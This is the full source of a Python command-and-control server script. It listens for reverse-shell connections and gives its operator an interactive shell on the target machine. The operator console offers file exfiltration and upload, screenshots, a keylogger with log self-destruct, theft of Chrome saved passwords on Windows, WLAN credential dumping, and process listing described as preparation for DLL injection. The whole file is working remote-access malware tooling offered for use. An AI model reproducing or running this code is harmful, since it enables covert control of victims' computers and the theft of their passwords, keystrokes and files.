#!/usr/bin/python3

import socket
from termcolor import colored  # python coloring library
import time
import os                      # Library provides a portable way of using operating system-dependent functionality
			       # which can be used by the C2 server owner, after getting a shell back from trgt

import json                    # The process of encoding JSON is usually called serialization.
                               # This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network.

import pyfiglet                # python library to print ASCII art fonts

import re                      # python regex module

# Getting wan/public ip:
def getting_wanip():

	print(colored("[*] Extracting wan/public ip ...", 'green'))

	result1 = recv_eff()
	result2 = trgt.recv(1024).decode('utf-8')

	print(result1+result2)


# Sending whole data all at once
def send_eff(data):

	json_data = json.dumps(data)
	trgt.send(json_data.encode('utf-8'))          # encoding data to bytes


# Receiving whole data all at once
def recv_eff():

	data = ''

	while True:
		try:
			data = data + trgt.recv(1024).decode('utf-8').rstrip() # decoding data and striping out EOL spacing
			return json.loads(data)

		except ValueError:
			continue

# For uploading files
def upload_file(file_name):

	file = open(file_name, 'rb')

	print(colored("[+] Droping file... ", 'green'))

	trgt.send(file.read())


# For downloading files
def download_file(file_name):

	file = open(file_name, 'wb')

	trgt.settimeout(1)

	# if all file datas are sent and nothing left for download,
	# the socket will keep on listening, but will not receive
	# anything, so if now it hangs(keeps on listening) for 1 sec,
	# while loop will break --> indicating file data transfer is
	# complete.

	print(colored("[+] Taking/receiving file... ", 'green'))

	data_small = trgt.recv(1024)

	while data_small:

		file.write(data_small)

		try:

			data_small = trgt.recv(1024)

		except socket.timeout:

			break

	trgt.settimeout(None)
	file.close()

# For knowing pid and running process name on trgt machine
def all_process_exists(info_list):

	c = 1
	print(colored("\n[+] Process Exists...\n", "green"))
	for elem in info_list:

		PID = elem['pid']
		P_Name = elem['name']

		print("+"*32)
		print(colored(f"Process{c}:\n", "cyan"))
		print(colored(f"pid:{PID}\nprocessName:{P_Name}\n", "cyan"))
		c += 1
	print("+"*32)


# For knowing inactive processes on trgt
def some_process_doesnt_exists(info_list, prf_list):

	# Converting list to string so that re module can be used
	info_string = str(info_list)

	# Extracting out all the names of the exe file which are running using regex
	pid_list = re.findall('[A-Za-z]+.exe',info_string)

	# converting to lowercase so that, it can be compared to the user given list
	pid_list = [ i.lower() for i in pid_list ]

	# Extracting out the processes which are not running
	left_elem = list(set(prf_list) - set(pid_list))
	left_elem = ', '.join(left_elem)
	print(colored(f"\n[-] No process named {left_elem} is/are running!", 'red'))



# Banner
def banner():

	bann = pyfiglet.figlet_format("C2 Server", font = "slant")
	print(colored(bann, 'cyan'))

	print("\r")
	print(colored("-"*50,'cyan'))
	print("\r")

	print(colored("Created by @soumyani1", 'cyan'))

	print("\n")

	print(colored("~> Please feel free to reach me for some suggestions:",'yellow'))

	print(colored('''
⚪ https://www.linkedin.com/in/soumyanil-biswas/
⚪ https://twitter.com/soumyani1
	''', 'cyan'))

def help():

	print(colored('''\n
  				      +------------------------+
  	    -:~~~~~~~~~~~~~~~~~~~~~~~~|  C&C Console Commands: |~~~~~~~~~~~~~~~~~~~~~~~~:-
  				      +------------------------+
  	''','green'))
	print(colored('''\n
		help                          :    Shows available Commands 

		exit                          :    To exit out from C&C Console environment

		Connect or connect or CONNECT
		(linux/windows)               :    To extablish connection and get a shell

''', 'yellow'))
	print(colored('\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~','green'))



# C2 server function
def server():

	global ip
	global trgt
	global sock

	
	banner()

	while True:

	# Getting C2 prompt before getting shell connection
		command = input(colored("C&C => ",'magenta' ,  attrs=['bold']))

		# exiting C2 Console
		if command == "exit":
			exit()

		elif command == "help":
			help()
			continue

		elif (command == "Connect") or (command == "CONNECT") or (command == "connect"):

			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


			ip = "0.0.0.0"                              # listening on any ip, change it (if you wish to)
			port = 1234                                 # chnage it (if you wish to)

			sock.bind((ip, port))                       # binding ip and port to form a method
			sock.listen(5)

			print(colored('''
[+] Listening For Incoming Connections''', 'green'))

			trgt, ip = sock.accept()
			print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
			print(colored("[+] For help section, type: 'help'", 'green'))
			print(colored("[!] To terminate the session, type: 'exit'\n", 'blue'))

			break


# Getting a shell from trgt
def shell():

	global cmd

	counter = 1

	while True:

		cmd = input(f"{username}@{ip}~> ")                # trgt shell prompt
		send_eff(cmd)


		# shell command support

		if cmd == "exit":  # ✓
			print(colored("\n[*] Closing connection...", 'yellow'))
			time.sleep(2)
			print(colored("[-] Connection Closed\n", 'red'))
			
			print(colored("[+] Back to C&C Console\n", 'green', attrs=['bold']))
			server()

		# Help command ✓
		elif cmd == "help":
			print(colored('''\n

List of available Commands:
----------------------------------------------------------------------------------------

help 						  :    Shows available Commands 

exit                          :    To terminate session

mkdir <directory>
(linux/windows)               :    To make folders

touch <file>
(linux/win)                   :    To make files

echo "<something>"            :    To display line of text/string that are passed as an argument

echo "<something>" >/>> file  :    To redirect text to a file, make files
(linux/windows)

cd <directory>
(linux/win)                   :    To change directory/folder

del <file>                    :    To remove files
(linux/win)

rmdir <folder>
OR                            :    To remove folder
rm -r <folder>
(linux/windows)

clear / cls (linux/windows)   :    To clear terminal/cmd
(Can be used interchangeably)

ls_h                          :    List files in host's present working directory

take <file> (linux/windows)   :    To exfiltrate file from trgt

drop <file> (linux/windows)   :    To infiltrate file from C2 server to trgt

screenshot OR  ss             :    To take screenshot and self destructs the screenshot from trgt

keylog_on                     :    To start keylogger

keylog_dump                   :    To print keystrokes

keylog_off                    :    To close keylogger and self destruct the logged file

spoof_passwd                  :    To spoof password as a file from trgt machine's browser (windows 10, Chrome browser Version 89.0.4389.90 (Official Build) (64-bit)) and sents to C2 Server.
(Windows only)

spoof_wlan_creds              :    Spoofs wlan wifi profile creds and public/wan ip of the trgt windows machine
(Windows only)

spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
(Windows only)

get_pid			      :    To know the processes running on the trgt 
(Windows only)			   [You can update the list present in the rev_shell.py]

''', 'green'))
			print(colored('You can also use other commands related to networking, etc for linux as well as windows','yellow'))
			print(colored('------------------------------------------------------------------------------------------','green'))

		# Making folder/directory in linux and windows ✓
		elif cmd[:5] == "mkdir" and len(cmd) > 1:

			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# Making file in linux ✓
		elif cmd[:5] == "touch" and len(cmd) > 1:
			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# Editing/writing on file on linux and windows ✓
		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>'):

			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt

		# Appending on file on linux and windows ✓
		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>>'):

			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt


		# clearing screen in windows/linux  ✓
		elif (cmd[:3] == "cls" and len(cmd) > 1) or (cmd[:5] == 'clear' and len(cmd) > 1):

			def screen_clear():
				os.system('cls' if os.name=='nt' else 'clear')
			screen_clear()


		# Changing directory  ✓
		elif cmd[:2] == "cd" and len(cmd) > 1:

			continue                           # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt


                # Removing file path in Win and linux  ✓
		elif cmd[:3] == "del" and len(cmd) > 1:

			continue   			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt


                # Removing folder in linux and Win      ✓
		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):

			continue 			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt


		# Password Spoofing from trgt win10 Chrome browser  ✓
		elif cmd[:12] == "spoof_passwd" and len(cmd) > 1:

			download_file("chrome_creds.txt")

			trgt.settimeout(5)                  # waiting for 5 seconds so that password decrypting and downloading in done with out any error


		# Spoof wan/public ip of trgt win10 machine   ✓
		elif cmd[:11] == "spoof_wanip" and len(cmd) > 1:

			getting_wanip()

		# spoofing wlan profile creds and wan/public ip from trgt win10 machine   ✓
		elif cmd[:16] == "spoof_wlan_creds" and len(cmd) > 1:

			# Getting wan ip
			getting_wanip()
			print("")

			# Getting wifi profile creds list from trgt 
			list_profiles = recv_eff() # it is a list which contians lists

			# looping through lists
			for creds in list_profiles:

				# looping within single element (list 1, list 2 ... list n) within the list
				for cred in creds:

					# parameters for getting creds
					auth = "Authentication"
					mode = "Cipher"
					key = "Security key"
					passwd = "Key Content"
					ssid = "SSID name"
					name = "Name"

					if name in cred:

						info = cred.split(":")[1][1:-1]

						print(colored("++++++++++++++++++++++++++++++++++++++",'green'))
						print("|",name,":",info,"|")
						print(colored("++++++++++++++++++++++++++++++++++++++",'green'))

					if ssid in cred:

						info = cred.split(":")[1][1:-1]
						print(ssid,":",info)

					if auth in cred:

						info = cred.split(":")[1][1:-1]
						print(auth,":", info)

					if mode in cred:

						info = cred.split(":")[1][1:-1]

						if info != "None":

							print(mode,":",info)

						else:
							print(mode,":",info)
							print("-"*50)

							continue

					if key in cred:

						info = cred.split(":")[1][1:-1]

						if info != "Absent":
							print(key,":",info)

						else:
							continue

					if passwd in cred:

						info = cred.split(":")[1][1:-1]
						print(passwd,":",info)
						print("-"*50)

		# Screenshot    ✓

		# screenshot function is same as download as after all we would only
		# download the captured image from trgt as rev_shell gonna take the ss
		elif (cmd[:10 ] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):

			file = open(f"screenshot{counter}.png", 'wb')

			trgt.settimeout(5)                   # taking 5 second for maximum as taking screenshot via rev_shell, and downloading it, can take time.

		        # if all file datas are sent and nothing left for download,
        		# the socket will keep on listening, but will not receive
		        # anything, so if now it hangs(keeps on listening) for 1 sec,
		        # while loop will break --> indicating file data transfer is
		        # complete.

			print(colored("[+] Capturing screenshot ... ", 'green'))

			data_small = trgt.recv(1024)

			while data_small:

				file.write(data_small)

				try:

					data_small = trgt.recv(1024)

				except socket.timeout:

					break

			trgt.settimeout(None)
			file.close()
			counter += 1

		# Getting running process id on win10 to perform dll injection  ✓
		elif cmd[:7] == "get_pid" and len(cmd) > 1:

			os_name = recv_eff()

			if os_name == 'nt':

				info_list = recv_eff()
				prf_list = recv_eff()

				if len(info_list) == len(prf_list):
					all_process_exists(info_list)

				elif len(info_list) < len(prf_list):
					some_process_doesnt_exists(info_list, prf_list)
					all_process_exists(info_list)

			elif os_name == 'posix':
				print(colored("\n[-] This OS is not Windows, command not applicable!\n ", "red"))


		# list files in host's pwd directory  ✓
		elif cmd[:4] == "ls_h" and len(cmd) > 1:

			os.system("dir")


		# Exfiltration in trgt point of view  ✓
		elif cmd[:4] == "take" and len(cmd) > 1:

			download_file(cmd[5:])

		# Infiltration in trgt point of view  ✓
		elif cmd[:4] == "drop" and len(cmd) > 1:

			upload_file(cmd[5:])

		else:
			result = recv_eff()  # received response
			print(result)



# Getting trgt username
def get_username():

	global username

	username = "whoami"                 # to know the username of the trgt
	send_eff(username)


	username = recv_eff()               # received response

	username = username.strip()         # Stripping out EOL spacing

	return username


def main():
	server()

	username = get_username()           # getting username for making interactive shell from trgt

	shell()                             # Getting shell for trgt
	sock.close()                        # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function


if __name__ == '__main__':
	main()

